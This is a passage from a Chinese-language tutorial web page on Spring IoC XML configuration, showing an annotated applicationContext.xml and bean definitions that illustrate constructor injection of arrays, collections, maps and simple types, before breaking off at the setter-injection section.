注解自动装配这些 Bean，实现依赖注入。</li></ol></li></ol><hr><h5 id="1-4-2、配置方式1：XML-配置文件-配置方式"><a href="#1-4-2、配置方式1：XML-配置文件-配置方式" class="headerlink" title="1.4.2、配置方式1：XML 配置文件 配置方式"></a>1.4.2、配置方式1：XML 配置文件 配置方式</h5><h6 id="1-4-2-1、创建-Spring-IoC-XML-配置文件"><a href="#1-4-2-1、创建-Spring-IoC-XML-配置文件" class="headerlink" title="1.4.2.1、创建 Spring IoC XML 配置文件"></a>1.4.2.1、创建 Spring IoC XML 配置文件</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- applicationContext.xml --&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span><br><span class="hljs-string"><span class="hljs-tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="1-4-2-2、采用构造注入"><a href="#1-4-2-2、采用构造注入" class="headerlink" title="1.4.2.2、采用构造注入"></a>1.4.2.2、采用构造注入</h6><p>&#x3D;&#x3D;1.为 Bean 类增添有参构造方法&#x3D;&#x3D;</p><p>&#x3D;&#x3D;2.声明 Bean 对象，并配置该 Bean 的属性注入&#x3D;&#x3D;</p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs django"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="hljs-string"><span class="hljs-tag"><span class="language-xml">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="language-xml">       </span><br><span class="language-xml">    <span class="hljs-comment">&lt;!-- 1. 声明 QianDaYe Bean 对象，一个 &lt;bean&gt; 标签就是一个 Bean 对象 --&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myBean&quot;</span>                          &lt;!<span class="hljs-attr">--</span> <span class="hljs-attr">Bean</span> <span class="hljs-attr">对象的唯一标识符</span>，<span class="hljs-attr">可以通过此</span> <span class="hljs-attr">ID</span> <span class="hljs-attr">引用该</span> <span class="hljs-attr">Bean</span>，<span class="hljs-attr">未指定时默认为类的全类名</span>，<span class="hljs-attr">例如</span> <span class="hljs-attr">com.example.MyBean</span>，<span class="hljs-attr">需要注意的是</span> <span class="hljs-attr">ID</span> <span class="hljs-attr">的首字母要小写</span> <span class="hljs-attr">--</span>&gt;</span></span><br><span class="language-xml">        class=&quot;com.example.MyBean&quot;           <span class="hljs-comment">&lt;!-- 必填项，Bean 对象的母 Bean 类的全类名，Spring 会使用这个类来创建 Bean 的实例 --&gt;</span></span><br><span class="language-xml">        primary=&quot;true&quot;                       <span class="hljs-comment">&lt;!-- 根据类型装配时，若有多个实现，该 Bean 为主要候选者 --&gt;</span></span><br><span class="language-xml">        lazy-init=&quot;true&quot;                     <span class="hljs-comment">&lt;!-- 是否开始懒加载，默认为 false，若为 true，Bean 对象将在第一次请求时被创建 --&gt;</span></span><br><span class="language-xml">        scope=&quot;prototype&quot;                    <span class="hljs-comment">&lt;!-- 指定 Bean 的作用域，默认为 singleton --&gt;</span></span><br><span class="language-xml">        init-method=&quot;initMethod&quot;             <span class="hljs-comment">&lt;!-- 初始化方法，该方法会在依赖注入完成后自动调用 --&gt;</span></span><br><span class="language-xml">        destroy-method=&quot;cleanup&quot;             <span class="hljs-comment">&lt;!-- 销毁方法，该方法会在 Spring 容器销毁 Bean 之前自动调用，通常用于清理资源 --&gt;</span></span><br><span class="language-xml">        factory-bean=&quot;myFactoryBean&quot;         <span class="hljs-comment">&lt;!-- 工厂 Bean，与 Bean 的实例化方式有关 --&gt;</span></span><br><span class="language-xml">        factory-method=&quot;createInstance&quot;      <span class="hljs-comment">&lt;!-- 工厂方法，与 Bean 的实例化方式有关 --&gt;</span></span><br><span class="language-xml">        autowire=&quot;byName&quot;&gt;                   <span class="hljs-comment">&lt;!-- 采用自动装配方式 --&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2. 配置该 Bean 的属性注入 --&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.1 对象类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;userDao&quot;</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;bankDao&quot;</span> /&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.2 简单数组 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.2.1 一维数组 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>25<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span> </span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>35<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.2.2 二维数组 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>25<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>35<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>40<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.3 复杂数组 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.3.1 一维数组 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bean1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bean2<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.3.2 二维数组 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object2<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object3<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object4<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.4 简单 List 集合 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>25<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>35<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.5 复杂 List 集合 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object2<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.6 简单 Set 集合 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>25<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span> </span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>30<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.7 复杂 Set 集合 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Object2<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.8 简单 Map 集合 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;age1&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;25&quot;</span>/&gt;</span> </span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;age2&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;30&quot;</span>/&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.9 复杂 Map 集合 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">map</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-comment">&lt;!-- 2.9.1 值是对象 --&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;AnotherBean&quot;</span> /&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">                <span class="hljs-comment">&lt;!-- 2.9.2 值是 List 集合 --&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Item1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Item2<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Item3<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean1&quot;</span> /&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean2&quot;</span> /&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean3&quot;</span> /&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">                <span class="hljs-comment">&lt;!-- 2.9.3 值是 Set 集合 --&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&quot;6&quot;</span>&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Value1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Value2<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>Value3<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean1&quot;</span> /&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean2&quot;</span> /&gt;</span></span><br><span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">ref</span> <span class="hljs-attr">bean</span>=<span class="hljs-string">&quot;bean3&quot;</span> /&gt;</span></span><br><span class="language-xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        </span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.10 注入简单数据类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.10.1 基本数据类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;25&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- int 类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- boolean 类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;99.99&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- double 类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;A&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- char 类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;1000L&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- long 类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;3.14&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- float 类型 --&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.10.2 包装类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;30&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- Integer 类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- Boolean 类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;200.50&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- Double 类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;B&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- Character 类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;5000&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- Long 类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;2.71&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- Float 类型 --&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">        <span class="hljs-comment">&lt;!-- 2.10.3 字符串类型 --&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;John Doe&quot;</span> /&gt;</span>  <span class="hljs-comment">&lt;!-- String 类型 --&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-comment">&lt;!-- 声明其他 Bean 对象 --&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.example.bean.QianDaYe&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;qianDaYe&quot;</span> /&gt;</span></span><br><span class="language-xml">    </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></span><br></code></pre></td></tr></table></figure><hr><h6 id="1-4-2-3、采用-Setter-注入"><a href="#1-4-2-3、采用-Setter-注入" class="headerlink" title="1.4.2.3、采用 Setter 注入"></a>1.4.2.3、采用 Setter 注入</h6><p>&#x3D;&#x3D;1.为 Bean 类增添 Setter 方法&#x3D;&#x3D;</p><p>&#x3D;&#x3D;2.声明 Bean 对象，并配置该对象的属性注入&#x3D;&#x3D;<br>要将构造注入改为 setter 注入，你需要使用 <code>&lt;property&gt;</code> 标签来替代 <code>&lt;constructor-arg&gt;</code> 标签</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 